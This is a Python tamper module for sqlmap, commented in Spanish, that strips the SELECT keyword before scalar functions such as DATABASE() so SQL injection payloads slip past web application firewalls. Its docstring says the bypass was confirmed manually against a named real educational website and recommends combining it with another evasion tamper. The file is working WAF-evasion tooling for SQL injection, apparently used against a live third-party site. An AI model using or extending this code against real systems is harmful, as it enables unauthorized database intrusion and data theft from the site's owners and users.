#!/usr/bin/env python
"""
Tamper script de sqlmap propio de inyector.

Quita la keyword SELECT cuando antecede directo a una llamada de
función escalar sin FROM (DATABASE(), CURRENT_USER(), SUBSTRING(), ...).
Evade WAFs que bloquean SELECT sin importar el delimitador entre la
keyword y el paréntesis -- confirmado manualmente contra
itescam.edu.mx, donde ni '(SELECT/**/database())' ni ninguna otra
variante con espacio/comentario pasaba el filtro, pero '(database())'
sola sí. Combinar con --tamper=space2comment para la keyword AND/OR
que sigue bloqueada por espacio literal.

Ejemplo:
    * Input:  (SELECT DATABASE())
    * Output: (DATABASE())

La lista de funciones está acotada a las que sqlmap usa para
banner-grabbing / extracción boolean-blind carácter por carácter, que
nunca necesitan FROM -- aplicar esto a un 'SELECT ... FROM
information_schema...' real rompería la sintaxis.

La transformación en sí (patrón + reemplazo) vive en
`inyector/utils/scalar_func_bypass.py` -- sin dependencias de sqlmap,
para que `WAFBypassProber` (recon/waf_bypass_prober.py) también pueda
probarla directo con requests HTTP crudos, sin pasar por este módulo
(que solo es importable DENTRO del proceso de sqlmap, con
`lib.core.enums` disponible).
"""

from lib.core.enums import PRIORITY

from inyector.utils.scalar_func_bypass import strip_select_before_scalar_func

__priority__ = PRIORITY.LOWEST


def dependencies():
    pass


def tamper(payload, **kwargs):
    """Quita 'SELECT ' cuando precede directo a una función escalar
    conocida, dejando la llamada a función sola.

    >>> tamper('(SELECT DATABASE())')
    '(DATABASE())'
    >>> tamper('(SELECT/**/CURRENT_USER())')
    '(CURRENT_USER())'
    """
    return strip_select_before_scalar_func(payload)
